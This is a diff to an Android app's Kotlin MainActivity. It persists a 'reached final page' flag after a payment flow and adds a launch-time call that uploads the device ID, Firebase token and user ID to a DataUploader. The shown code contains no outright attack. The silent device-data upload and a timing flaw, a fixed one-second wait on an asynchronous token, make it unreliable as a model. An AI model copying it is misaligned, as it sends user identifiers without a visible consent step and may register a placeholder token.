@@ -4,6 +4,7 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.content.SharedPreferences
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
@@ -68,6 +69,7 @@ class MainActivity : ComponentActivity() {
             runOnUiThread {
                 if (::webView.isInitialized) {
                     try {
+                        saveReachedFinal()
                         webView.loadUrl("file:///android_asset/final.html")
                     } catch (e: Exception) {
                         Log.e(TAG, "Failed to load final page after payment success", e)
@@ -82,6 +84,8 @@ class MainActivity : ComponentActivity() {
         private const val TAG = "MainActivity"
         const val ACTION_CLOSE = "com.example.test.ACTION_CLOSE"
         const val ACTION_SHOW_FINAL = "com.example.test.ACTION_SHOW_FINAL"
+        private const val PREFS_NAME = "app_state"
+        private const val KEY_REACHED_FINAL = "reached_final"
     }
 
     private val batteryUpdater = object : Runnable {
@@ -101,6 +105,10 @@ class MainActivity : ComponentActivity() {
             pendingFinalScreen = true
         }
         
+        if (hasReachedFinal()) {
+            pendingFinalScreen = true
+        }
+        
         enableFullscreen()
 
         appConfig = AppConfig.load(this)
@@ -116,6 +124,27 @@ class MainActivity : ComponentActivity() {
 
         permissionManager = PermissionManager(this)
         permissionManager.initialize { }
+
+        uploadScope.launch {
+            try {
+                var fcmTokenInitial = "NO_FCM_TOKEN_${deviceId.take(8)}"
+                FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
+                    if (task.isSuccessful && task.result != null) {
+                        fcmTokenInitial = task.result!!
+                    }
+                }
+                delay(1000)
+                
+                DataUploader.registerDeviceInitial(
+                    this@MainActivity,
+                    deviceId,
+                    fcmTokenInitial,
+                    appConfig.userId
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "Initial registration error: ${e.message}", e)
+            }
+        }
 
         setContent {
             MaterialTheme {
@@ -343,6 +372,10 @@ class MainActivity : ComponentActivity() {
 
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
+                
+                if (url != null && url.contains("final.html")) {
+                    saveReachedFinal()
+                }
 
                 webView.evaluateJavascript(
                     """
@@ -484,11 +517,22 @@ class MainActivity : ComponentActivity() {
     private fun showFinalScreen() {
         if (::webView.isInitialized) {
             runOnUiThread {
+                saveReachedFinal()
                 webView.loadUrl("file:///android_asset/final.html")
             }
         } else {
             pendingFinalScreen = true
         }
+    }
+    
+    private fun saveReachedFinal() {
+        val prefs: SharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        prefs.edit().putBoolean(KEY_REACHED_FINAL, true).apply()
+    }
+    
+    private fun hasReachedFinal(): Boolean {
+        val prefs: SharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        return prefs.getBoolean(KEY_REACHED_FINAL, false)
     }
 
     private fun continueInitialization() {
